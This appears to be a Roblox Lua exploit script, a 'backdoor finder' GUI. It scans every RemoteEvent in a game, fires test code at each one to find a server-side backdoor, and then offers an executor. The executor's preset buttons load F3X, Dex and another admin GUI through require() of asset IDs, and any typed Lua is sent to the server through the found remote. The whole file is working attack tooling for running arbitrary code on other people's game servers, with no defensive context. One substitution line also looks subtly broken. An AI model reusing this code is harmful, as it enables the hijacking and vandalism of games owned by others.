function sandbox(var,func)
	local env = getfenv(func)
	local newenv = setmetatable({},{
		__index = function(self,k)
			if k=="script" then
				return var
			else
				return env[k]
			end
		end,
	})
	setfenv(func,newenv)
	return func
end
cors = {}
mas = Instance.new("Model",game:GetService("Lighting"))
ScreenGui0 = Instance.new("ScreenGui")
Frame1 = Instance.new("Frame")
LocalScript2 = Instance.new("LocalScript")
TextLabel3 = Instance.new("TextLabel")
LocalScript4 = Instance.new("LocalScript")
ObjectValue5 = Instance.new("ObjectValue")
Frame6 = Instance.new("Frame")
ScrollingFrame7 = Instance.new("ScrollingFrame")
TextButton8 = Instance.new("TextButton")
LocalScript9 = Instance.new("LocalScript")
TextButton10 = Instance.new("TextButton")
LocalScript11 = Instance.new("LocalScript")
TextButton12 = Instance.new("TextButton")
LocalScript13 = Instance.new("LocalScript")
TextBox14 = Instance.new("TextBox")
TextLabel15 = Instance.new("TextLabel")
LocalScript16 = Instance.new("LocalScript")
TextButton17 = Instance.new("TextButton")
LocalScript18 = Instance.new("LocalScript")
TextButton19 = Instance.new("TextButton")
LocalScript20 = Instance.new("LocalScript")
TextButton21 = Instance.new("TextButton")
LocalScript22 = Instance.new("LocalScript")
ScreenGui0.Name = "zza"
ScreenGui0.Parent = mas
ScreenGui0.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
Frame1.Name = "LoadingUI"
Frame1.Parent = ScreenGui0
Frame1.Position = UDim2.new(0.499078393, 0, 0.499235392, 0)
Frame1.Size = UDim2.new(0, 301, 0, 100)
Frame1.Active = true
Frame1.AnchorPoint = Vector2.new(0.5, 0.5)
Frame1.BackgroundColor = BrickColor.new("Institutional white")
Frame1.BackgroundColor3 = Color3.new(1, 1, 1)
Frame1.BorderColor = BrickColor.new("Really black")
Frame1.BorderColor3 = Color3.new(0, 0, 0)
Frame1.BorderSizePixel = 0
Frame1.ZIndex = 0
LocalScript2.Parent = Frame1
table.insert(cors,sandbox(LocalScript2,function()
local txt = script.Parent.Status

txt.Text = [[Initialized!
Finding all RemoteEvents..
.Find RE backdoor
.Pass backdoored RE
.Load MainUI with fancy anims]]

wait(1)

local remotes = {}
for i,v in pairs(game:GetDescendants()) do
	if v:IsA("RemoteEvent") then
		print("Found remote: game."..v:GetFullName())
		remotes[i] = v
	end
end

txt.Text = [[Initialized!
Found all RemoteEvents!
Finding a backdoor..
.Pass backdoored RE
.Load MainUI with fancy anims]]

wait(0.1)

for i,remote in pairs(remotes) do
	remote:FireServer("local i = Instance.new('BoolValue') i.Name = 'i' i.Value = true i.Parent = game.ReplicatedStorage")
	wait(0.125)
	if game.ReplicatedStorage:FindFirstChild("i") then
		script.Parent.Parent.re.Value = remote
		txt.Text = [[Initialized!
Found all RemoteEvents!
Found a backdoor!
Passed backdoor RE!
Loading MainUI...]]
		for k,v in pairs(remotes) do
			if v ~= remote then
				table.remove(remotes,table.find(remotes,v))
			end
		end
		game.ReplicatedStorage:FindFirstChild("i"):Destroy()
	end
end

if script.Parent.Parent.re.Value == nil then
	txt.Text = [[Initialized!
Found all RemoteEvents!
Failed to find a backdoor!
.Pass backdoored RE
.Load MainUI with fancy anims]]
	wait(5)
	script.Disabled = true
	script.Parent.Parent:Destroy()
	return
end

wait(0.2)

txt.Text = [[Initialized!
Found all RemoteEvents!
Found a backdoor!
Passed backdoor RE!
Loaded MainUI!]]

local ts = game:GetService("TweenService")

local tp = UDim2.new(0.5, 0, -1, 0)

local ti = TweenInfo.new(2, Enum.EasingStyle.Elastic, Enum.EasingDirection.InOut)
local t = ts:Create(script.Parent, ti, {Position = tp})

t:Play()

wait(2)

script.Parent.Parent.MainUI.Visible = true
script.Parent.Parent.MainUI.Active = true

tp = UDim2.new(0.5,0,0.5,0)

t = ts:Create(script.Parent.Parent.MainUI, ti, {Position = tp})

t:Play()

wait(2)

script.Parent:Destroy()
end))
TextLabel3.Name = "Status"
TextLabel3.Parent = Frame1
TextLabel3.Size = UDim2.new(0, 301, 0, 100)
TextLabel3.BackgroundColor = BrickColor.new("Institutional white")
TextLabel3.BackgroundColor3 = Color3.new(1, 1, 1)
TextLabel3.BackgroundTransparency = 1
TextLabel3.BorderColor = BrickColor.new("Really black")
TextLabel3.BorderColor3 = Color3.new(0, 0, 0)
TextLabel3.BorderSizePixel = 0
TextLabel3.Font = Enum.Font.SourceSans
TextLabel3.FontSize = Enum.FontSize.Size18
TextLabel3.Text = "Initialized!"
TextLabel3.TextColor = BrickColor.new("Institutional white")
TextLabel3.TextColor3 = Color3.new(1, 1, 1)
TextLabel3.TextSize = 18
TextLabel3.TextWrap = true
TextLabel3.TextWrapped = true
TextLabel3.TextXAlignment = Enum.TextXAlignment.Left
TextLabel3.TextYAlignment = Enum.TextYAlignment.Top
LocalScript4.Name = "drag"
LocalScript4.Parent = Frame1
table.insert(cors,sandbox(LocalScript4,function()
--Not made by me, check out this video: https://www.youtube.com/watch?v=z25nyNBG7Js&t=22s
--Put this inside of your Frame and configure the speed if you would like.
--Enjoy! Credits go to: https://www.youtube.com/watch?v=z25nyNBG7Js&t=22s

local UIS = game:GetService('UserInputService')
local frame = script.Parent
local dragToggle = nil
local dragSpeed = 0.25
local dragStart = nil
local startPos = nil

local function updateInput(input)
	local delta = input.Position - dragStart
	local position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X,
		startPos.Y.Scale, startPos.Y.Offset + delta.Y)
	game:GetService('TweenService'):Create(frame, TweenInfo.new(dragSpeed), {Position = position}):Play()
end

frame.InputBegan:Connect(function(input)
	if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) then 
		dragToggle = true
		dragStart = input.Position
		startPos = frame.Position
		input.Changed:Connect(function()
			if input.UserInputState == Enum.UserInputState.End then
				dragToggle = false
			end
		end)
	end
end)

UIS.InputChanged:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
		if dragToggle then
			updateInput(input)
		end
	end
end)

end))
ObjectValue5.Name = "re"
ObjectValue5.Parent = ScreenGui0
Frame6.Name = "MainUI"
Frame6.Parent = ScreenGui0
Frame6.Position = UDim2.new(0.5, 0, -1, 0)
Frame6.Visible = false
Frame6.Size = UDim2.new(0, 248, 0, 147)
Frame6.AnchorPoint = Vector2.new(0.5, 0.5)
Frame6.BackgroundColor = BrickColor.new("Black metallic")
Frame6.BackgroundColor3 = Color3.new(0.117647, 0.117647, 0.117647)
Frame6.BorderColor = BrickColor.new("Really black")
Frame6.BorderColor3 = Color3.new(0, 0, 0)
Frame6.BorderSizePixel = 0
ScrollingFrame7.Name = "ScriptUI"
ScrollingFrame7.Parent = Frame6
ScrollingFrame7.Position = UDim2.new(0, 266, 0, 0)
ScrollingFrame7.Size = UDim2.new(0, 114, 0, 147)
ScrollingFrame7.Active = true
ScrollingFrame7.BackgroundColor = BrickColor.new("Black")
ScrollingFrame7.BackgroundColor3 = Color3.new(0.156863, 0.156863, 0.156863)
ScrollingFrame7.BorderColor = BrickColor.new("Really black")
ScrollingFrame7.BorderColor3 = Color3.new(0, 0, 0)
ScrollingFrame7.BorderSizePixel = 0
ScrollingFrame7.ScrollBarThickness = 6
TextButton8.Name = "f3x"
TextButton8.Parent = ScrollingFrame7
TextButton8.Size = UDim2.new(0, 108, 0, 16)
TextButton8.BackgroundColor = BrickColor.new("Black metallic")
TextButton8.BackgroundColor3 = Color3.new(0.117647, 0.117647, 0.117647)
TextButton8.BorderColor = BrickColor.new("Really black")
TextButton8.BorderColor3 = Color3.new(0, 0, 0)
TextButton8.BorderSizePixel = 0
TextButton8.Font = Enum.Font.Nunito
TextButton8.FontSize = Enum.FontSize.Size14
TextButton8.Text = "F3X"
TextButton8.TextColor = BrickColor.new("Really black")
TextButton8.TextColor3 = Color3.new(0, 0, 0)
TextButton8.TextScaled = true
TextButton8.TextSize = 14
TextButton8.TextWrap = true
TextButton8.TextWrapped = true
LocalScript9.Parent = TextButton8
table.insert(cors,sandbox(LocalScript9,function()
script.Parent.MouseButton1Down:Connect(function()
	script.Parent.Parent.Parent.code.Text = "require(4869378421).F3X('%username%')"
end)
end))
TextButton10.Name = "dex"
TextButton10.Parent = ScrollingFrame7
TextButton10.Position = UDim2.new(0, 0, 0, 16)
TextButton10.Size = UDim2.new(0, 108, 0, 16)
TextButton10.BackgroundColor = BrickColor.new("Black metallic")
TextButton10.BackgroundColor3 = Color3.new(0.117647, 0.117647, 0.117647)
TextButton10.BorderColor = BrickColor.new("Really black")
TextButton10.BorderColor3 = Color3.new(0, 0, 0)
TextButton10.BorderSizePixel = 0
TextButton10.Font = Enum.Font.Nunito
TextButton10.FontSize = Enum.FontSize.Size14
TextButton10.Text = "Dex"
TextButton10.TextColor = BrickColor.new("Really black")
TextButton10.TextColor3 = Color3.new(0, 0, 0)
TextButton10.TextScaled = true
TextButton10.TextSize = 14
TextButton10.TextWrap = true
TextButton10.TextWrapped = true
LocalScript11.Parent = TextButton10
table.insert(cors,sandbox(LocalScript11,function()
script.Parent.MouseButton1Down:Connect(function()
	script.Parent.Parent.Parent.code.Text = "require(4786706026):dex('%username%')"
end)
end))
TextButton12.Name = "h-loversgui"
TextButton12.Parent = ScrollingFrame7
TextButton12.Position = UDim2.new(0, 0, 0, 32)
TextButton12.Size = UDim2.new(0, 108, 0, 16)
TextButton12.BackgroundColor = BrickColor.new("Black metallic")
TextButton12.BackgroundColor3 = Color3.new(0.117647, 0.117647, 0.117647)
TextButton12.BorderColor = BrickColor.new("Really black")
TextButton12.BorderColor3 = Color3.new(0, 0, 0)
TextButton12.BorderSizePixel = 0
TextButton12.Font = Enum.Font.Nunito
TextButton12.FontSize = Enum.FontSize.Size14
TextButton12.Text = "H-LoversGUI"
TextButton12.TextColor = BrickColor.new("Really black")
TextButton12.TextColor3 = Color3.new(0, 0, 0)
TextButton12.TextScaled = true
TextButton12.TextSize = 14
TextButton12.TextWrap = true
TextButton12.TextWrapped = true
LocalScript13.Parent = TextButton12
table.insert(cors,sandbox(LocalScript13,function()
script.Parent.MouseButton1Down:Connect(function()
	script.Parent.Parent.Parent.code.Text = "require(5346235551).B1847('%username%')"
end)
end))
TextBox14.Name = "code"
TextBox14.Parent = Frame6
TextBox14.Position = UDim2.new(0, 0, 0, 16)
TextBox14.Size = UDim2.new(0, 248, 0, 98)
TextBox14.BackgroundColor = BrickColor.new("Black")
TextBox14.BackgroundColor3 = Color3.new(0.156863, 0.156863, 0.156863)
TextBox14.BorderColor = BrickColor.new("Really black")
TextBox14.BorderColor3 = Color3.new(0, 0, 0)
TextBox14.BorderSizePixel = 0
TextBox14.Font = Enum.Font.SourceSans
TextBox14.FontSize = Enum.FontSize.Size14
TextBox14.Text = ""
TextBox14.TextColor = BrickColor.new("Really black")
TextBox14.TextColor3 = Color3.new(0, 0, 0)
TextBox14.TextSize = 14
TextBox14.TextWrap = true
TextBox14.TextWrapped = true
TextBox14.TextXAlignment = Enum.TextXAlignment.Left
TextBox14.TextYAlignment = Enum.TextYAlignment.Top
TextBox14.ClearTextOnFocus = false
TextLabel15.Name = "name"
TextLabel15.Parent = Frame6
TextLabel15.Size = UDim2.new(0, 248, 0, 17)
TextLabel15.BackgroundColor = BrickColor.new("Institutional white")
TextLabel15.BackgroundColor3 = Color3.new(1, 1, 1)
TextLabel15.BackgroundTransparency = 1
TextLabel15.BorderColor = BrickColor.new("Really black")
TextLabel15.BorderColor3 = Color3.new(0, 0, 0)
TextLabel15.BorderSizePixel = 0
TextLabel15.Font = Enum.Font.SourceSans
TextLabel15.FontSize = Enum.FontSize.Size14
TextLabel15.Text = "BD-F (Credits - AlmousMarvelous, QuickQuarnt)"
TextLabel15.TextColor = BrickColor.new("Institutional white")
TextLabel15.TextColor3 = Color3.new(1, 1, 1)
TextLabel15.TextScaled = true
TextLabel15.TextSize = 14
TextLabel15.TextWrap = true
TextLabel15.TextWrapped = true
LocalScript16.Name = "drag"
LocalScript16.Parent = TextLabel15
table.insert(cors,sandbox(LocalScript16,function()
local UIS = game:GetService('UserInputService')
local frame = script.Parent.Parent
local dragToggle = nil
local dragSpeed = 0.5
local dragStart = nil
local startPos = nil

local function updateInput(input)
	local delta = input.Position - dragStart
	local position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X,
		startPos.Y.Scale, startPos.Y.Offset + delta.Y)
	game:GetService('TweenService'):Create(frame, TweenInfo.new(dragSpeed), {Position = position}):Play()
end

frame.InputBegan:Connect(function(input)
	if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) then 
		dragToggle = true
		dragStart = input.Position
		startPos = frame.Position
		input.Changed:Connect(function()
			if input.UserInputState == Enum.UserInputState.End then
				dragToggle = false
			end
		end)
	end
end)

UIS.InputChanged:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
		if dragToggle then
			updateInput(input)
		end
	end
end)

end))
TextButton17.Name = "Run"
TextButton17.Parent = Frame6
TextButton17.Position = UDim2.new(0, 7, 0, 119)
TextButton17.Size = UDim2.new(0, 76, 0, 21)
TextButton17.BackgroundColor = BrickColor.new("Black")
TextButton17.BackgroundColor3 = Color3.new(0.156863, 0.156863, 0.156863)
TextButton17.BorderColor = BrickColor.new("Really black")
TextButton17.BorderColor3 = Color3.new(0, 0, 0)
TextButton17.BorderSizePixel = 0
TextButton17.Font = Enum.Font.Nunito
TextButton17.FontSize = Enum.FontSize.Size14
TextButton17.Text = "Execute"
TextButton17.TextColor = BrickColor.new("Really black")
TextButton17.TextColor3 = Color3.new(0, 0, 0)
TextButton17.TextScaled = true
TextButton17.TextSize = 14
TextButton17.TextWrap = true
TextButton17.TextWrapped = true
LocalScript18.Parent = TextButton17
table.insert(cors,sandbox(LocalScript18,function()
script.Parent.MouseButton1Down:Connect(function()
	local code = script.Parent.Parent.code.Text
	local re = script.Parent.Parent.Parent.re.Value

	code = string.sub(code, "%username%", game.Players.LocalPlayer.Name)

	re:FireServer(code)
end)
end))
TextButton19.Name = "Clear"
TextButton19.Parent = Frame6
TextButton19.Position = UDim2.new(0, 87, 0, 119)
TextButton19.Size = UDim2.new(0, 76, 0, 21)
TextButton19.BackgroundColor = BrickColor.new("Black")
TextButton19.BackgroundColor3 = Color3.new(0.156863, 0.156863, 0.156863)
TextButton19.BorderColor = BrickColor.new("Really black")
TextButton19.BorderColor3 = Color3.new(0, 0, 0)
TextButton19.BorderSizePixel = 0
TextButton19.Font = Enum.Font.Nunito
TextButton19.FontSize = Enum.FontSize.Size14
TextButton19.Text = "Clear"
TextButton19.TextColor = BrickColor.new("Really black")
TextButton19.TextColor3 = Color3.new(0, 0, 0)
TextButton19.TextScaled = true
TextButton19.TextSize = 14
TextButton19.TextWrap = true
TextButton19.TextWrapped = true
LocalScript20.Parent = TextButton19
table.insert(cors,sandbox(LocalScript20,function()
script.Parent.MouseButton1Down:Connect(function()
	script.Parent.Parent.code.Text = ""
end)
end))
TextButton21.Name = "Exit"
TextButton21.Parent = Frame6
TextButton21.Position = UDim2.new(0, 166, 0, 119)
TextButton21.Size = UDim2.new(0, 76, 0, 21)
TextButton21.BackgroundColor = BrickColor.new("Black")
TextButton21.BackgroundColor3 = Color3.new(0.156863, 0.156863, 0.156863)
TextButton21.BorderColor = BrickColor.new("Really black")
TextButton21.BorderColor3 = Color3.new(0, 0, 0)
TextButton21.BorderSizePixel = 0
TextButton21.Font = Enum.Font.Nunito
TextButton21.FontSize = Enum.FontSize.Size14
TextButton21.Text = "Exit"
TextButton21.TextColor = BrickColor.new("Really black")
TextButton21.TextColor3 = Color3.new(0, 0, 0)
TextButton21.TextScaled = true
TextButton21.TextSize = 14
TextButton21.TextWrap = true
TextButton21.TextWrapped = true
LocalScript22.Parent = TextButton21
table.insert(cors,sandbox(LocalScript22,function()
script.Parent.MouseButton1Down:Connect(function()
	script.Parent.Parent.Parent:Destroy()
end)
end))
for i,v in pairs(mas:GetChildren()) do
	v.Parent = game:GetService("Players").LocalPlayer.PlayerGui
	pcall(function() v:MakeJoints() end)
end
mas:Destroy()
for i,v in pairs(cors) do
	spawn(function()
		pcall(v)
	end)
end
